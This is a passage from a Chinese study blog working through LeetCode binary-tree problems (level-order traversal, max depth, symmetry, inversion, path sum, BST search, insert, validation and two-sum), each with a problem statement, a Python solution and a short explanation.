<h2 id="第11天-树"><a href="#第11天-树" class="headerlink" title="第11天 树"></a>第11天 树</h2><h3 id="102-二叉树的层序遍历-【中等】"><a href="#102-二叉树的层序遍历-【中等】" class="headerlink" title="102. 二叉树的层序遍历 【中等】"></a>102. 二叉树的层序遍历 【中等】</h3><h4 id="题目描述-23"><a href="#题目描述-23" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你二叉树的根节点 <code>root</code> ，返回其节点值的 <strong>层序遍历</strong> 。 （即逐层地，从左到右访问所有节点）。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/102.jpeg"><br><code>输入：root = [3,9,20,null,null,15,7] 输出：[[3],[9,20],[15,7]]</code></p>
<p><strong>示例 2：</strong><br><code>输入：root = [1] 输出：[[1]]</code></p>
<p><strong>示例 3：</strong><br><code>输入：root = [] 输出：[]</code> </p>
<h4 id="代码-23"><a href="#代码-23" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            res.append([node.val <span class="keyword">for</span> node <span class="keyword">in</span> queue])</span><br><span class="line">            </span><br><span class="line">            kids = []</span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> queue:</span><br><span class="line">                <span class="keyword">if</span> node.left:</span><br><span class="line">                    kids.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right:</span><br><span class="line">                    kids.append(node.right)</span><br><span class="line"></span><br><span class="line">            queue = kids</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>


<h4 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h4><p>空子树返回空列表；<br>根结点入队列 queue，queue 表示当前层的结点，开始遍历：<br>    把当前层 queue 的结点的值以列表形式入队列 res ；<br>    遍历当前层 queue 的每个结点的左子结点、右子结点，入队列 kids<br>    然后把 queue 列表更新成当前层的孩子节点列表 kids ，直到 queue 为空<br>最后返回值列表 res </p>
<h3 id="104-二叉树的最大深度-【简单】"><a href="#104-二叉树的最大深度-【简单】" class="headerlink" title="104. 二叉树的最大深度 【简单】"></a>104. 二叉树的最大深度 【简单】</h3><h4 id="题目描述-24"><a href="#题目描述-24" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个二叉树，找出其最大深度。</p>
<p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>
<p><strong>说明:</strong> 叶子节点是指没有子节点的节点。</p>
<p><strong>示例：</strong></p>
<p>给定二叉树 <code>[3,9,20,null,null,15,7]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>返回它的最大深度 3 。</p>
<h4 id="代码-24"><a href="#代码-24" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left_height = self.maxDepth(root.left)</span><br><span class="line">            right_heitght = self.maxDepth(root.right)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left_height, right_heitght) + <span class="number">1</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>


<h4 id="分析-24"><a href="#分析-24" class="headerlink" title="分析"></a>分析</h4><p>采用【递归】：<br>    如果根结点为空，返回高度 0<br>    否则递归函数取得左子树和右子树的高度，最后返回 <code>最大深度+1</code>（根结点）</p>
<h3 id="101-对称二叉树-【简单】"><a href="#101-对称二叉树-【简单】" class="headerlink" title="101. 对称二叉树 【简单】"></a>101. 对称二叉树 【简单】</h3><h4 id="题目描述-25"><a href="#题目描述-25" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个二叉树的根节点 <code>root</code> ， 检查它是否轴对称。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/101-1.jpeg"><br><code>输入：root = [1,2,2,3,4,4,3] 输出：true</code></p>
<p><strong>示例 2：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/101-2.jpeg"><br><code>输入：root = [1,2,2,null,3,null,3] 输出：false</code></p>
<h4 id="代码-25"><a href="#代码-25" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSymmetric</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> </span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">left, right</span>):</span></span><br><span class="line">            <span class="keyword">if</span> left <span class="keyword">and</span> right:</span><br><span class="line">                <span class="keyword">if</span> left.val != right.val:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> check(left.left, right.right) <span class="keyword">and</span> check(left.right, right.left):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> left <span class="keyword">or</span> right:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>     </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> check(root.left, root.right)   </span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="分析-25"><a href="#分析-25" class="headerlink" title="分析"></a>分析</h4><p>同样采用【递归】分别遍历左子树和右子树：</p>
<ul>
<li>如果子树都为真：<ul>
<li>如果根结点值不相等返回 False；</li>
<li>检查左子树的左孩子与右子树的右孩子、左子树的右孩子与右子树的左孩子是否对称，如果都对称则返回 True；</li>
<li>其他情况返回 False</li>
</ul>
</li>
<li>如果子树有一个不为真：<ul>
<li>返回 False</li>
</ul>
</li>
<li>其他情况（两个子树都为空）：<ul>
<li>返回True</li>
</ul>
</li>
</ul>
<h2 id="第12天-树"><a href="#第12天-树" class="headerlink" title="第12天 树"></a>第12天 树</h2><h3 id="226-翻转二叉树-【简单】"><a href="#226-翻转二叉树-【简单】" class="headerlink" title="226. 翻转二叉树 【简单】"></a>226. 翻转二叉树 【简单】</h3><h4 id="题目描述-26"><a href="#题目描述-26" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一棵二叉树的根节点 <code>root</code> ，翻转这棵二叉树，并返回其根节点。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/226-1.jpeg"><br><code>输入：root = [4,2,7,1,3,6,9] 输出：[4,7,2,9,6,3,1]</code></p>
<p><strong>示例 2：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/226-2.jpeg"><br><code>输入：root = [2,1,3] 输出：[2,3,1]</code></p>
<p><strong>示例 3：</strong><br><code>输入：root = [] 输出：[]</code></p>
<h4 id="代码-26"><a href="#代码-26" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">invertTree</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        </span><br><span class="line">        root.left, root.right = root.right, root.left</span><br><span class="line">        self.invertTree(root.left)</span><br><span class="line">        self.invertTree(root.right)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>


<h4 id="分析-26"><a href="#分析-26" class="headerlink" title="分析"></a>分析</h4><p>跟上一题对称二叉树很像，首先判断是否为空，空则直接返回（返回空列表报错，要返回树结点）<br>然后翻转左右结点，再调用递归（本函数）翻左右子树</p>
<h3 id="112-路径总和-【简单】"><a href="#112-路径总和-【简单】" class="headerlink" title="112. 路径总和 【简单】"></a>112. 路径总和 【简单】</h3><h4 id="题目描述-27"><a href="#题目描述-27" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你二叉树的根节点 <code>root</code> 和一个表示目标和的整数 <code>targetSum</code> 。判断该树中是否存在 <strong>根节点到叶子节点</strong> 的路径，这条路径上所有节点值相加等于目标和 <code>targetSum</code> 。如果存在，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><strong>叶子节点</strong> 是指没有子节点的节点。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/112-1.jpeg"><br><code>输入：root = [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum = 22 输出：true 解释：等于目标和的根节点到叶节点路径如上图所示。</code></p>
<p><strong>示例 2：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/112-2.jpeg"><br><code>输入：root = [1,2,3], targetSum = 5 输出：false 解释：树中存在两条根节点到叶子节点的路径： (1 --&gt; 2): 和为 3 (1 --&gt; 3): 和为 4 不存在 sum = 5 的根节点到叶子节点的路径。</code></p>
<p><strong>示例 3：</strong><br><code>输入：root = [], targetSum = 0 输出：false 解释：由于树是空的，所以不存在根节点到叶子节点的路径。</code></p>
<h4 id="代码-27"><a href="#代码-27" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasPathSum</span>(<span class="params">self, root, targetSum</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type targetSum: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root.left <span class="keyword">and</span> <span class="keyword">not</span> root.right:</span><br><span class="line">            <span class="keyword">return</span> targetSum == root.val</span><br><span class="line">        <span class="keyword">return</span> self.hasPathSum(root.left, targetSum - root.val) <span class="keyword">or</span> self.hasPathSum(root.right, targetSum - root.val)</span><br></pre></td></tr></table></figure>


<h4 id="分析-27"><a href="#分析-27" class="headerlink" title="分析"></a>分析</h4><p>整理题目要求功能思路：询问是否存在从当前节点 root 到叶子节点的路径，满足其路径和为 sum。</p>
<p>假定从根节点到当前节点的值之和为 val，我们可以将这个大问题转化为一个小问题：是否存在从当前节点的子节点到叶子的路径，满足其路径和为 sum - val。</p>
<p>不难发现这满足<strong>递归</strong>的性质：</p>
<ul>
<li>若当前节点就是叶子节点，那么我们直接判断 sum 是否等于 val 即可（因为路径和已经确定，就是当前节点的值，我们只需要判断该路径和是否满足条件）。</li>
<li>若当前节点不是叶子节点，我们只需要递归地询问它的子节点是否能满足条件即可。</li>
</ul>
<h2 id="第13天-树"><a href="#第13天-树" class="headerlink" title="第13天 树"></a>第13天 树</h2><h3 id="700-二叉树中的搜索-【简单】"><a href="#700-二叉树中的搜索-【简单】" class="headerlink" title="700. 二叉树中的搜索 【简单】"></a>700. 二叉树中的搜索 【简单】</h3><h4 id="题目描述-28"><a href="#题目描述-28" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定二叉搜索树（BST）的根节点 <code>root</code> 和一个整数值 <code>val</code>。</p>
<p>你需要在 BST 中找到节点值等于 <code>val</code> 的节点。 返回以该节点为根的子树。 如果节点不存在，则返回 <code>null</code> 。</p>
<p><strong>示例 1:</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/700-1.jpeg"><br><code>输入：root = [4,2,7,1,3], val = 2 输出：[2,1,3]</code></p>
<p><strong>示例 2:</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/700-2.jpeg"><br><code>输入：root = [4,2,7,1,3], val = 5 输出：[]</code></p>
<h4 id="代码-28"><a href="#代码-28" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchBST</span>(<span class="params">self, root, val</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type val: int</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> val == root.val:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        <span class="keyword">elif</span> val &lt; root.val:</span><br><span class="line">            <span class="keyword">return</span> self.searchBST(root.left, val)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.searchBST(root.right, val)</span><br></pre></td></tr></table></figure>


<h4 id="分析-28"><a href="#分析-28" class="headerlink" title="分析"></a>分析</h4><p>首先必须知道<strong>二叉搜索树</strong>满足如下性质：</p>
<ul>
<li>左子树所有节点的元素值均小于根的元素值；</li>
<li>右子树所有节点的元素值均大于根的元素值。</li>
</ul>
<p>据此可以得到如下算法：</p>
<ul>
<li>若 root 为空则返回空节点；</li>
<li>若 val=root.val，则返回 root；</li>
<li>若 val&lt;root.val，递归左子树；</li>
<li>若 val&gt;root.val，递归右子树。</li>
</ul>
<h3 id="702-二叉树中的插入操作-【中等】"><a href="#702-二叉树中的插入操作-【中等】" class="headerlink" title="702. 二叉树中的插入操作 【中等】"></a>702. 二叉树中的插入操作 【中等】</h3><h4 id="题目描述-29"><a href="#题目描述-29" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定二叉搜索树（BST）的根节点 <code>root</code> 和要插入树中的值 <code>value</code> ，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据 <strong>保证</strong> ，新值和原始二叉搜索树中的任意节点值都不同。</p>
<p><strong>注意</strong> 可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回 <strong>任意有效的结果</strong> 。</p>
<p><strong>示例 1：</strong></p>
<p><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/700-1.jpeg"><br>`<br>输入：root = [4,2,7,1,3], val = 5<br>输出：[4,2,7,1,3,5]<br>解释：另一个满足题目要求可以通过的树是：<br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/700-2.jpeg"></p>
<p>`</p>
<p><strong>示例 2：</strong><br><code>输入：root = [40,20,60,10,30,50,70], val = 25 输出：[40,20,60,10,30,50,70,null,null,25]</code></p>
<p><strong>示例 3：</strong><br><code>输入：root = [4,2,7,1,3,null,null,null,null,null,null], val = 5 输出：[4,2,7,1,3,5]</code></p>
<h4 id="代码-29"><a href="#代码-29" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insertIntoBST</span>(<span class="params">self, root, val</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type val: int</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> TreeNode(val)</span><br><span class="line">        pos = root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> pos:</span><br><span class="line">            <span class="keyword">if</span> val &lt; pos.val:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> pos.left:</span><br><span class="line">                    pos.left = TreeNode(val)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pos = pos.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> pos.right:</span><br><span class="line">                    pos.right = TreeNode(val)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pos = pos.right </span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>


<h4 id="分析-29"><a href="#分析-29" class="headerlink" title="分析"></a>分析</h4><p>这里需要插入需要新建一个结点 TreeNode ，且最终返回整棵树（也就是不能使用 root 进行操作传参）</p>
<ul>
<li>判断是否为空子树，若是则直接新建根结点</li>
<li>然后判断根结点值是否小于 val ，左子树如果存在，则继续往下遍历左子树，否则直接新建结点</li>
<li>若大于 val ，右子树若存在空，则继续遍历右子树，否则插入新建结点</li>
</ul>
<h2 id="第14天-树"><a href="#第14天-树" class="headerlink" title="第14天 树"></a>第14天 树</h2><h3 id="98-验证二叉搜索树-【中等】"><a href="#98-验证二叉搜索树-【中等】" class="headerlink" title="98. 验证二叉搜索树 【中等】"></a>98. 验证二叉搜索树 【中等】</h3><h4 id="题目描述-30"><a href="#题目描述-30" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个二叉树的根节点 <code>root</code> ，判断其是否是一个有效的二叉搜索树。</p>
<p><strong>有效</strong> 二叉搜索树定义如下：</p>
<ul>
<li>节点的左子树只包含 <strong>小于</strong> 当前节点的数。</li>
<li>节点的右子树只包含 <strong>大于</strong> 当前节点的数。</li>
<li>所有左子树和右子树自身必须也是二叉搜索树。</li>
</ul>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/98-1.jpeg"><br><code>输入：root = [2,1,3] 输出：true</code></p>
<p><strong>示例 2：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/98-2.jpeg"><br><code>输入：root = [5,1,4,null,null,3,6] 输出：false 解释：根节点的值是 5 ，但是右子节点的值是 4 。</code></p>
<h4 id="代码-30"><a href="#代码-30" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValidBST</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        stack = []</span><br><span class="line">        pre = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> root <span class="keyword">or</span> stack:</span><br><span class="line">            <span class="comment"># 一直向左子树走，每一次将当前节点保存到栈中</span></span><br><span class="line">            <span class="keyword">if</span> root:</span><br><span class="line">                stack.append(root)</span><br><span class="line">                root = root.left</span><br><span class="line">            <span class="comment"># 当前节点为空，证明走到了最左边，从栈中弹出节点</span></span><br><span class="line">            <span class="comment"># 开始对右子树重复上述过程</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = stack.pop()</span><br><span class="line">                <span class="comment"># 判断序列是否有序</span></span><br><span class="line">                <span class="keyword">if</span> pre <span class="keyword">and</span> cur.val &lt;= pre.val:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                pre = cur</span><br><span class="line">                root = cur.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>


<h4 id="分析-30"><a href="#分析-30" class="headerlink" title="分析"></a>分析</h4><p>初始化一个空栈 stack ，和一个保存前结点的 pre ，<br>从根结点开始一直向左子树遍历，同时将当前结点入栈，<br>当走到最左叶子结点之后弹出栈顶元素，然后判断序列是否有序，无序返回 False：<br>    + 当子结点无右子树时，重复以上步骤<br>    + 当子结点有右子树时遍历右子树，结点入栈，然后判断是否有序<br>直到遍历完二叉树，返回 True</p>
<h3 id="653-两数之和-IV-——-输入二叉搜索树-【简单】"><a href="#653-两数之和-IV-——-输入二叉搜索树-【简单】" class="headerlink" title="653. 两数之和 IV —— 输入二叉搜索树 【简单】"></a>653. 两数之和 IV —— 输入二叉搜索树 【简单】</h3><h4 id="题目描述-31"><a href="#题目描述-31" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个二叉搜索树 <code>root</code> 和一个目标结果 <code>k</code>，如果二叉搜索树中存在两个元素且它们的和等于给定的目标结果，则返回 <code>true</code>。</p>
<p><strong>示例 1：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/653-1.jpeg"><br><code>输入: root = [5,3,6,2,4,null,7], k = 9 输出: true</code></p>
<p><strong>示例 2：</strong><br><img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/653-2.jpeg"><br><code>输入: root = [5,3,6,2,4,null,7], k = 28 输出: false</code></p>
<h4 id="代码-31"><a href="#代码-31" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findTarget</span>(<span class="params">self, root, k</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k - root.val) <span class="keyword">in</span> self.s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        self.s.add(root.val)</span><br><span class="line">        <span class="keyword">return</span> self.findTarget(root.left, k) <span class="keyword">or</span> self.findTarget(root.right, k)</span><br></pre></td></tr></table></figure>


